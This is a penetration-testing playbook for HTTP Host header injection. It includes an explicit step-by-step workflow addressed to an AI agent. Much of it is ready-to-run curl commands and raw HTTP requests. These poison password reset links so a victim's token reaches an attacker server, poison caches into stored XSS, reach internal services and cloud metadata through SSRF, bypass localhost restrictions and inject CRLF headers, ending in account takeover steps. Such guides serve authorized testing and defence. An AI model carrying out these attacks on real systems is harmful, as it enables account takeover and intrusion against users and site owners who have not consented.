# Host Header Injection

> **Summary**: Manipulate the HTTP Host header (or equivalent override headers) to influence server-side logic that trusts the header value.
> **Impact**: Password reset poisoning, web cache poisoning, routing-based SSRF, access to internal virtual hosts, authentication bypass.
> **Typical Severity**: Medium - High

## Detection

### Indicators
- Application reflects the Host header value in responses (links, redirects, emails)
- Password reset links contain the Host header value as the domain
- Application serves different content based on Host header
- Cache behaves differently when Host header is modified

### Automated Detection
```bash
# headi - automated host header injection testing
# https://github.com/mlcsec/headi
headi -url http://<TARGET>

# Burp Suite - Param Miner extension (guess headers)
# Burp Suite - Active scan for host header issues
```

### Manual Detection
```bash
# Change Host header and observe response
curl -H "Host: evil.com" http://<TARGET>/

# Test override headers
curl -H "X-Forwarded-Host: evil.com" http://<TARGET>/
curl -H "X-Host: evil.com" http://<TARGET>/

# Supply two Host headers
curl -H "Host: <TARGET>" -H "Host: evil.com" http://<TARGET>/

# Absolute URL with different Host
curl --request-target "http://<TARGET>/" -H "Host: evil.com" http://<TARGET>/

# Host with port
curl -H "Host: <TARGET>:evil.com" http://<TARGET>/
curl -H "Host: <TARGET>@evil.com" http://<TARGET>/
```

## Exploitation

### Prerequisites
- Application uses the Host header value in server-side logic (link generation, routing, caching)
- No strict Host header validation or whitelist
- Reverse proxy / load balancer forwards override headers

### Attack Vectors

#### 1. Password Reset Poisoning
An attacker requests a password reset for a known user, intercepts the request, and modifies the Host header. If the application uses the Host value to build the reset URL, the victim receives an email with a link pointing to the attacker's domain.

```
POST /forgot-password HTTP/1.1
Host: <ATTACKER_DOMAIN>
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

If blocked, try override headers:
```
POST /forgot-password HTTP/1.1
Host: <TARGET>
X-Forwarded-Host: <ATTACKER_DOMAIN>
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

**Success criteria**: Victim receives reset email with link pointing to `<ATTACKER_DOMAIN>`. When they click it, the token is sent to the attacker.

#### 2. Web Cache Poisoning via Host Header
```
GET / HTTP/1.1
Host: <ATTACKER_DOMAIN>

# Or with override header (more likely to bypass restrictions)
GET / HTTP/1.1
Host: <TARGET>
X-Forwarded-Host: <ATTACKER_DOMAIN>
```

If the response includes a link/script referencing the injected host and the cache stores it, subsequent users receive the poisoned response.

#### 3. Routing-Based SSRF
Manipulate the Host header to route the request to an internal service:
```
GET /admin HTTP/1.1
Host: 192.168.0.1
```

#### 4. Access Control Bypass
Some applications restrict admin panels to specific hostnames:
```
GET /admin HTTP/1.1
Host: localhost

GET /admin HTTP/1.1
Host: 127.0.0.1
```

#### 5. Virtual Host Enumeration
Fuzz the Host header to discover internal virtual hosts:
```bash
ffuf -u http://<TARGET_IP>/ -w <VHOST_WORDLIST> -H "Host: FUZZ.<TARGET_DOMAIN>" -fs <DEFAULT_SIZE>
gobuster vhost -u http://<TARGET_IP> -w <VHOST_WORDLIST> --domain <TARGET_DOMAIN>
```

### Override Headers to Test
```
X-Forwarded-Host: <ATTACKER_DOMAIN>
X-Host: <ATTACKER_DOMAIN>
X-HTTP-Host-Override: <ATTACKER_DOMAIN>
X-Forwarded-Server: <ATTACKER_DOMAIN>
Forwarded: host=<ATTACKER_DOMAIN>
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

### Proof of Concept
```bash
# Password reset poisoning
curl -X POST http://<TARGET>/forgot-password \
  -H "Host: <TARGET>" \
  -H "X-Forwarded-Host: <ATTACKER_SERVER>" \
  -d "email=victim@example.com"

# Check attacker server logs for token arrival
```

## Bypasses

### Localhost Blacklist Bypass
If `localhost` or `127.0.0.1` is blocked:

| Technique | Value |
|-----------|-------|
| Decimal encoding | `2130706433` |
| Hex encoding | `0x7f000001` |
| Octal encoding | `0177.0000.0000.0001` |
| Zero | `0` |
| Short form | `127.1` |
| IPv6 | `::1`, `0000::1`, `::ffff:127.0.0.1` |
| External resolving domain | `localtest.me`, `spoofed.burpcollaborator.net` |

### Double Host Header
```
Host: <TARGET>
Host: <ATTACKER_DOMAIN>
```
Some servers/proxies use the first, others the second.

### Host Header with Port Injection
```
Host: <TARGET>:@<ATTACKER_DOMAIN>
Host: <TARGET> <ATTACKER_DOMAIN>
Host: <TARGET>%0d%0aX-Injected: header
```

### Absolute URL Override
```
GET http://<TARGET>/ HTTP/1.1
Host: <ATTACKER_DOMAIN>
```
The absolute URL takes precedence in some implementations.

## Escalation
- **Password reset poisoning** --> [Account Takeover](account-takeover.md)
- **Cache poisoning** --> Stored XSS affecting all users via [Cache Poisoning](cache-poisoning.md)
- **Routing-based SSRF** --> Access internal services via [SSRF](ssrf.md)
- **Admin panel access** --> Full application compromise
- **CRLF via Host** --> Header injection, response splitting

## Tools

| Tool | Usage |
|------|-------|
| [headi](https://github.com/mlcsec/headi) | `headi -url http://<TARGET>` |
| Burp Suite (Param Miner) | Automated header guessing and testing |
| ffuf | `ffuf -u http://<IP>/ -H "Host: FUZZ.<DOMAIN>" -w <WORDLIST>` |
| gobuster | `gobuster vhost -u http://<IP> -w <WORDLIST> --domain <DOMAIN>` |
| curl | Manual header injection testing |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for Host header injection.

### Phase 1: Discovery
1. Send a request with a modified Host header and check if it is reflected in the response body (links, redirects, page content):
   ```bash
   curl -H "Host: evil.com" https://<TARGET>/ -sD -
   ```
2. Test override headers that may be trusted by the application or reverse proxy:
   ```bash
   curl -H "X-Forwarded-Host: evil.com" https://<TARGET>/
   curl -H "X-Host: evil.com" https://<TARGET>/
   curl -H "X-Forwarded-Server: evil.com" https://<TARGET>/
   curl -H "Forwarded: host=evil.com" https://<TARGET>/
   ```
3. Identify application features that generate URLs based on the Host header: password reset emails, email verification links, absolute URLs in redirects, canonical tags, sitemap generation.
4. Check if the application serves different content based on the Host header (virtual hosting).

### Phase 2: Validation
1. **Test password reset poisoning**: Trigger a password reset for your own account while modifying the Host header:
   ```http
   POST /forgot-password HTTP/1.1
   Host: <ATTACKER_DOMAIN>
   Content-Type: application/x-www-form-urlencoded

   email=<YOUR_EMAIL>
   ```
   Check the received email -- does the reset link point to `<ATTACKER_DOMAIN>`?
2. If the Host header modification is blocked, test override headers:
   ```http
   POST /forgot-password HTTP/1.1
   Host: <TARGET>
   X-Forwarded-Host: <ATTACKER_DOMAIN>

   email=<YOUR_EMAIL>
   ```
3. Test double Host header:
   ```
   Host: <TARGET>
   Host: <ATTACKER_DOMAIN>
   ```
4. Test absolute URL with different Host:
   ```
   GET http://<TARGET>/ HTTP/1.1
   Host: <ATTACKER_DOMAIN>
   ```
5. Test Host with port injection: `Host: <TARGET>:@<ATTACKER_DOMAIN>`.

### Phase 3: Exploitation
1. **Password reset poisoning**: Send the reset request for the victim's email with `Host: <ATTACKER_DOMAIN>` or `X-Forwarded-Host: <ATTACKER_DOMAIN>`. When the victim clicks the reset link in their email, the token is sent to the attacker's server.
2. **Cache poisoning via Host**: Inject the Host header value into a cacheable response. If the cache stores it, subsequent users receive the poisoned response with attacker-controlled links/scripts.
3. **Routing-based SSRF**: Set `Host: 192.168.0.1` or `Host: localhost` to route the request to internal services.
4. **Access control bypass**: Set `Host: localhost` to access admin panels restricted to specific hostnames.
5. **Virtual host enumeration**: Fuzz the Host header to discover internal virtual hosts:
   ```bash
   ffuf -u http://<TARGET_IP>/ -w <VHOST_WORDLIST> -H "Host: FUZZ.<TARGET_DOMAIN>" -fs <DEFAULT_SIZE>
   ```

### Phase 4: Escalation
1. **Password reset poisoning to ATO**: Capture the victim's reset token on your server, then use it to reset their password and take over the account.
2. **Cache poisoning to stored XSS**: If the poisoned response includes a script tag referencing the attacker's domain, all users loading the cached page execute the attacker's JavaScript.
3. **SSRF to internal network**: Use routing-based SSRF to access internal APIs, cloud metadata (`169.254.169.254`), or admin interfaces.
4. **CRLF via Host header**: If the Host header is reflected in response headers, inject `%0d%0a` for header injection or response splitting.

## Decision Tree

```
Start: Test Host header reflection in response
  |
  +---> Host value reflected in links/redirects?
  |       +---> Yes: Test password reset poisoning
  |       |       +---> Reset link contains attacker domain? --> ATO
  |       +---> Reflected in cached response? --> Cache poisoning
  |
  +---> Direct Host change blocked?
  |       +---> Test X-Forwarded-Host
  |       +---> Test X-Host, X-Forwarded-Server, Forwarded
  |       +---> Test double Host header
  |       +---> Test absolute URL with different Host
  |
  +---> Routing-based behavior?
          +---> Host: localhost/127.0.0.1 --> Access admin panel
          +---> Host: internal-ip --> SSRF to internal services
```

## Success Criteria
- [ ] Host header (or override header) value is reflected in the application response
- [ ] Password reset link contains attacker-controlled domain
- [ ] If cache poisoning: cached response includes attacker-controlled content served to other users
- [ ] If SSRF: internal service or admin panel accessed via Host header manipulation
- [ ] If ATO: password reset token captured on attacker server, account access gained

## References
- [PortSwigger - HTTP Host Header Attacks](https://portswigger.net/web-security/host-header)
- [PayloadsAllTheThings - Host Header Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Host%20Header%20Injection)
- [OWASP - Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)

## See Also
- [Cache Poisoning](cache-poisoning.md)
- [SSRF](ssrf.md)
- [Password Reset Vulnerabilities](reset-password.md)
- [Account Takeover](account-takeover.md)
